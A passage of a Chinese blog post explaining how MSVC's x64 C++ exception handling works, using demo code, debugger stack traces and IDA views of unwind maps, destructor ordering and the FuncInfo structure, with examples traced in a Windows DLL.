    <content type="html"><![CDATA[<p>偶尔分析C++的模块, 遇到触发异常操作, 但是不知道它SEH到底干啥了, 所以研究了下MSVC下的c++异常处理到底是怎么回事, 没理解透彻, 但是逆向应该是够用了, 如果有不对之处, 还望指正.</p><span id="more"></span><h1 id="C-try-catch"><a href="#C-try-catch" class="headerlink" title="C++ try catch"></a>C++ try catch</h1><p>这是一段示例的测试代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(<span class="string">&quot;disable&quot;</span>:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionA</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionA</span>(<span class="type">int</span> a, <span class="type">int</span> b) :<span class="built_in">a</span>(a), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionB</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionB</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionC</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionC</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Strobj</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Strobj</span>() = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="built_in">Strobj</span>(<span class="type">char</span>* a) &#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">        str_ = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy_s</span>(str_, len+<span class="number">1</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* str_ = <span class="literal">NULL</span>;</span><br><span class="line">    ~<span class="built_in">Strobj</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (str_) &#123;</span><br><span class="line">            <span class="keyword">delete</span> str_;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Strobj <span class="title">doThrow</span><span class="params">(<span class="type">bool</span> doth)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="function">Strobj <span class="title">oops</span><span class="params">(str)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (doth)</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">ExceptionA</span>(a, b);</span><br><span class="line">    <span class="keyword">return</span> oops;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Strobj a = <span class="built_in">doThrow</span>(<span class="literal">true</span>);</span><br><span class="line">        std::cout &lt;&lt; a.str_ &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionC&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionC caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionB&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionB caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionA&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionA caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (std::exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很简单, 就是申请一个对象后触发异常.<br>正常情况下, 在触发异常后, 它会调用析构函数释放<code>str_</code>, 然后调用异常模块输出 “ExceptionA caught”.</p><p>这里简要介绍一下SEH, SEH就是异常捕获流程, 当程序发生异常的时候, 会跳转到最近(指最近的try catch)异常捕获函数, 它可以获取触发异常时的寄存器数据, 通过寄存器就知道触发异常时的原因, 如果能处理, 就修改异常时的rip值来跳转到后续的正常指令流, 如果不能处理就交给下一个SEH handler.</p><p>所以如果要知道触发异常后它怎么操作, 就看它注册的seh handler就行. 不过呢, msvc的C++ 对SEH做了封装, 异常由 <code>_CxxThrowException</code> 抛出. 处理会由<code>__GSHandlerCheck_EH4</code>进行简单操作后调用<code>__CxxFrameHandler4</code>进行处理</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>我们在调试器里对析构函数下断点, 触发断点后, 查看栈回溯, 得到如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">test.exe!`doThrow&#x27;::`1&#x27;::dtor$0()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de1030()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de4307()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de66ab()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de2cd2()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de2f5a()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de6dfb()</span><br><span class="line">test.exe!__GSHandlerCheck_EH4(_EXCEPTION_RECORD * ExceptionRecord=0x000000473ff0de60, void * EstablisherFrame=0x000000473ff0f9d0, _CONTEXT * ContextRecord=0x000000473ff0d760, _DISPATCHER_CONTEXT * DispatcherContext=0x000000473ff0dcd0) 行 73</span><br><span class="line">在 D:\a\_work\1\s\src\vctools\crt\vcstartup\src\gs\amd64\gshandlereh4.cpp(73)</span><br><span class="line">ntdll.dll!00007ff9c5bb242f()</span><br><span class="line">ntdll.dll!00007ff9c5b40939()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de6a7f()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de1c1e()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de218b()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de2ec5()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de2f5a()</span><br><span class="line">vcruntime140_1d.dll!00007ff990de6dfb()</span><br><span class="line">test.exe!__GSHandlerCheck_EH4(_EXCEPTION_RECORD * ExceptionRecord=0x000000473ff0eff0, void * EstablisherFrame=0x000000473ff0fbc0, _CONTEXT * ContextRecord=0x000000473ff0eb00, _DISPATCHER_CONTEXT * DispatcherContext=0x000000473ff0e980) 行 73</span><br><span class="line">在 D:\a\_work\1\s\src\vctools\crt\vcstartup\src\gs\amd64\gshandlereh4.cpp(73)</span><br><span class="line">ntdll.dll!00007ff9c5bb23af()</span><br><span class="line">ntdll.dll!00007ff9c5b614b4()</span><br><span class="line">ntdll.dll!00007ff9c5bb0ebe()</span><br><span class="line">KernelBase.dll!00007ff9c341cf19()</span><br><span class="line">vcruntime140d.dll!00007ff96105bbf1()</span><br><span class="line">test.exe!doThrow(bool doth=true) 行 45</span><br><span class="line">在 D:\Projects\test\test\main.cpp(45)</span><br><span class="line">test.exe!main() 行 52</span><br><span class="line">在 D:\Projects\test\test\main.cpp(52)</span><br></pre></td></tr></table></figure><p>可以看到, 它先调用的<code>__GSHandlerCheck_EH4</code>两次, 再调用了&#96;&#96;&#96;&#96;doThrow’::&#96;1’::dtor$0&#96;&#96;&#96;操作.</p><p>而且析构函数是先于catch模块调用的. C++没有<code>finally</code>关键词, 也是因为有析构函数, 就不需要finally了</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(<span class="string">&quot;disable&quot;</span>:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionA</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionA</span>(<span class="type">int</span> a, <span class="type">int</span> b) :<span class="built_in">a</span>(a), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionB</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionB</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ExceptionC</span> : <span class="keyword">public</span> exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ExceptionC</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Strobj</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> index;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Strobj</span>() &#123;</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">        <span class="type">char</span> a[] = <span class="string">&quot;abcdefghijklmnopq&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* s = &amp;a[index];</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">        str_ = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy_s</span>(str_, len + <span class="number">1</span>, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Strobj</span>(<span class="type">char</span>* a) &#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">        str_ = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy_s</span>(str_, len+<span class="number">1</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* str_ = <span class="literal">NULL</span>;</span><br><span class="line">    ~<span class="built_in">Strobj</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (str_) &#123;</span><br><span class="line">            <span class="keyword">delete</span> str_;</span><br><span class="line">            str_ = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Strobj::index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Strobj <span class="title">doThrow</span><span class="params">(<span class="type">bool</span> doth)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="function">Strobj <span class="title">oops</span><span class="params">(str)</span></span>;</span><br><span class="line">    <span class="function">Strobj <span class="title">oops2</span><span class="params">(&amp;str[<span class="number">1</span>])</span></span>;</span><br><span class="line">    <span class="function">Strobj <span class="title">oops3</span><span class="params">(&amp;str[<span class="number">2</span>])</span></span>;</span><br><span class="line">    Strobj* myObjectPtr = <span class="keyword">new</span> Strobj;</span><br><span class="line">    <span class="keyword">auto</span> myObjectPtr2 = std::<span class="built_in">make_unique</span>&lt;Strobj&gt;();</span><br><span class="line">    <span class="keyword">auto</span> myObjectPtr3 = std::<span class="built_in">make_shared</span>&lt;Strobj&gt;();</span><br><span class="line">    <span class="keyword">if</span> (doth)</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">ExceptionA</span>(a, b);</span><br><span class="line">    std::cout &lt;&lt; oops2.str_ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; oops3.str_ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; myObjectPtr-&gt;str_ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; myObjectPtr2-&gt;str_ &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; myObjectPtr3-&gt;str_ &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> myObjectPtr;</span><br><span class="line">    <span class="keyword">return</span> oops;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        Strobj a = <span class="built_in">doThrow</span>(<span class="literal">true</span>);</span><br><span class="line">        std::cout &lt;&lt; a.str_ &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionC&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionC caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionB&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionB caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (ExceptionA&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionA caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (std::exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionA1 caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;ExceptionA2 caught&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次新增了两个<code>Strobj</code>对象, 新增了, <code>release</code>编译后, 使用ida看看有什么不一样.</p><p>选择<code>doThrow</code>函数, 按’X’查看引用:</p><p><img src="/images/CPlusPlus_Exception.assets/1712127361714.png" alt="1712127361714"></p><p>跟进<code>.pdata</code>的引用:</p><p><img src="/images/CPlusPlus_Exception.assets/1712127336162.png" alt="1712127336162"></p><p>跟进 <code>stru_14002DFAC</code>:</p><p><img src="/images/CPlusPlus_Exception.assets/1712127420884.png" alt="1712127420884"></p><p>可以看到多个析构函数. </p><h2 id="再次调试"><a href="#再次调试" class="headerlink" title="再次调试"></a>再次调试</h2><p>开启调试, 分别对所有偏移的函数下断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">??1?$shared_ptr@VStrobj@@@std@@QEAA@XZ</span><br><span class="line">_doThrow____1___dtor$10</span><br><span class="line">??1?$unique_ptr@VStrobj@@U?$default_delete@VStrobj@@@std@@@std@@QEAA@XZ</span><br><span class="line">_doThrow____1___dtor$7</span><br><span class="line">_doThrow____1___dtor$3</span><br><span class="line">??1Strobj@@QEAA@XZ</span><br><span class="line">??1Strobj@@QEAA@XZ</span><br><span class="line">_doThrow____1___dtor$0</span><br></pre></td></tr></table></figure><p>继续运行, 看看触发情况:</p><p>第一个命中的是最后的一个shared_ptr的析构函数, 释放的是<code>myObjectPtr3</code></p><p><img src="/images/CPlusPlus_Exception.assets/1712127520943.png" alt="1712127520943"></p><p>第二个命中的是unique_ptr的析构函数, 释放的是<code>myObjectPtr2</code></p><p><img src="/images/CPlusPlus_Exception.assets/1712127599116.png" alt="1712127599116"></p><p>第三个命中的直接是Strobj的析构函数, 释放的是<code>oops3</code>,</p><p><img src="/images/CPlusPlus_Exception.assets/1712127849317.png" alt="1712127849317"></p><p>第四个是<code>oops2</code></p><p>最后是<code>oops</code></p><p><img src="/images/CPlusPlus_Exception.assets/1712127884472.png" alt="1712127884472"></p><p>从断点命中情况来看, 它命中了<code>stru_14002DFAC</code>里的部分析构函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">??1?$shared_ptr@VStrobj@@@std@@QEAA@XZ</span><br><span class="line">??1?$unique_ptr@VStrobj@@U?$default_delete@VStrobj@@@std@@@std@@QEAA@XZ</span><br><span class="line">??1Strobj@@QEAA@XZ</span><br><span class="line">??1Strobj@@QEAA@XZ</span><br><span class="line">_doThrow____1___dtor$0</span><br></pre></td></tr></table></figure><p>但是, 这里有一个问题, <strong>那就是<code>myObjectPtr</code>并没有得到释放!!</strong></p><blockquote><p>我们用debug调试, 记录<code>myObjectPtr-&gt;str_</code>的地址, 当命中catch时, 查看该值, 发现没有被重置, 再次说明它并没有被释放</p></blockquote><p>因为它是new申请的, 需要我们手动释放, 而它又是个局部变量, 我们没法在catch里正常释放它, 导致它的内存丢失了.</p><p>再来看main.</p><p><img src="/images/CPlusPlus_Exception.assets/1712128404597.png" alt="1712128404597"></p><p><img src="/images/CPlusPlus_Exception.assets/1712128467028.png" alt="1712128467028"></p><p>可以看到 main的<code>.pdata</code>里对应的<code>stru_14002E010</code>里, 有main的异常处理的代码块的<code>rva</code>.   这里因为有4个catch, 所以有4个异常处理块.</p><p>所以我们也可以发现, 在try catch操作中, 存在catch的函数, 它的stru指向里就有catch的操作模块, 也会给出异常的类型.</p><p>对于包含在其中的其它调用子函数, 如果存在自动释放的对象, 也会自动调用析构函数, 而且析构函数是比catch先调用的. 但是对于不会自动释放的对象, 就需要我们注意它的释放情况了.</p><blockquote><p>Debug的版本会略有不同.  MSVC版本不一样也可能不同</p><p>另外, 异常里的<code>rdx</code>指向的是触发异常时的<code>rsp</code>指针</p></blockquote><h2 id="msvc举例-win11"><a href="#msvc举例-win11" class="headerlink" title="msvc举例(win11)"></a>msvc举例(win11)</h2><p>iassam.dll里</p><p><img src="/images/CPlusPlus_Exception.assets/1712112112479.png" alt="1712112112479"></p><p>触发异常, 理论上应该处理 v12, v9, v11, 跟踪其struc后:</p><p><img src="/images/CPlusPlus_Exception.assets/1712112164618.png" alt="1712112164618"></p><p><img src="/images/CPlusPlus_Exception.assets/1712112155063.png" alt="1712112155063"></p><p>可以看到有三个释放操作的rva. 所以它触发异常后, 应该就会调用这些析构操作.</p><p>上层函数<code>ChangePassword::onSyncRequest</code>:</p><p><img src="/images/CPlusPlus_Exception.assets/1712112295271.png" alt="1712112295271"></p><p><img src="/images/CPlusPlus_Exception.assets/1712113662570.png" alt="1712113662570"></p><p>可以看到, 下半截是catch相关的操作, 上半截是析构相关的操作. 因此这个函数有<code>try catch</code>.</p><p>下面是<code>ChangePassword::doChangePassword</code>的栈回溯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00000097`ea97f020 00007ff9`e6a76ad2     iassam!ChangePassword::doChangePassword+0x9c</span><br><span class="line">01 00000097`ea97f090 00007ff9`e6a759dc     iassam!ChangePassword::onSyncRequest+0xb2</span><br><span class="line">02 00000097`ea97f0e0 00007ff9`e6a75948     iassam!IASTL::IASRequestHandlerSync::onAsyncRequest+0x7c</span><br><span class="line">03 00000097`ea97f110 00007ff9`e846311c     iassam!IASTL::IASRequestHandler::OnRequest+0xa8</span><br><span class="line">04 00000097`ea97f140 00007ff9`e8462e3f     iaspolcy!Pipeline::executeNext+0x154</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对这些位置下断点, 在<code>ChangePassword::doChangePassword</code>里面触发异常, 可以看到最后命中的是<code>IASTL::IASRequestHandlerSync::onAsyncRequest+0x7C</code> (即 <code>7ff9e6a759dc</code>)的位置.</p><p>说明触发异常后, <code>ChangePassword::onSyncRequest</code>里处理了函数异常, 所以正常返回到了上层函数call之后的位置.</p><h2 id="旧版本msvc举例-server-2016"><a href="#旧版本msvc举例-server-2016" class="headerlink" title="旧版本msvc举例(server 2016)"></a>旧版本msvc举例(server 2016)</h2><p><img src="/images/CPlusPlus_Exception.assets/1712114532284.png" alt="1712114532284"></p><p><img src="/images/CPlusPlus_Exception.assets/1712114562160.png" alt="1712114562160"></p><p>这里只有个rva <code>stru_1800321D0</code>, 跟入:</p><p><img src="/images/CPlusPlus_Exception.assets/1712114602198.png" alt="1712114602198"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">s_FuncInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        magicNumber:<span class="number">29</span>;<span class="comment">//19930522h     // Identifies version of compiler</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        bbtFlags:<span class="number">3</span>;         <span class="comment">// flags that may be set by BBT processing</span></span><br><span class="line">    <span class="type">__ehstate_t</span>         maxState;<span class="comment">// 4           // Highest state number plus one (thus</span></span><br><span class="line">                                            <span class="comment">// number of entries in unwind map)</span></span><br><span class="line">    <span class="type">int</span>                 dispUnwindMap;<span class="comment">// rva stru_180033B7C      // Image relative offset of the unwind map</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nTryBlocks;<span class="comment">// 1         // Number of &#x27;try&#x27; blocks in this function</span></span><br><span class="line">    <span class="type">int</span>                 dispTryBlockMap;<span class="comment">// rva stru_180033B9C    // Image relative offset of the handler map</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nIPMapEntries;<span class="comment">// 12      // # entries in the IP-to-state map. NYI (reserved)</span></span><br><span class="line">    <span class="type">int</span>                 dispIPtoStateMap;<span class="comment">// rva stru_180033BE0  IPtoStateMap // Image relative offset of the IP to state map. rva of struct IptoStateMapEntry</span></span><br><span class="line">    <span class="type">int</span>                 dispUwindHelp;<span class="comment">// 32      // Displacement of unwind helpers from base</span></span><br><span class="line">    <span class="type">int</span>                 dispESTypeList;<span class="comment">// 0     // Image relative list of types for exception specifications</span></span><br><span class="line">    <span class="type">int</span>                 EHFlags;<span class="comment">// 1            // Flags for some features.</span></span><br><span class="line">&#125; FuncInfo;</span><br></pre></td></tr></table></figure><p>这里 <code>stru_1800321D0</code> 对应的结构体就是如上所示.</p><p><code>UnwindMapEntry</code>:</p><p><img src="/images/CPlusPlus_Exception.assets/1712134784970.png" alt="1712134784970"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UnwindMapEntry</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> toState;        <span class="comment">// target state</span></span><br><span class="line">  <span class="type">void</span> (*action)();   <span class="comment">// action to perform (unwind funclet address)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到当state为1转为0时, 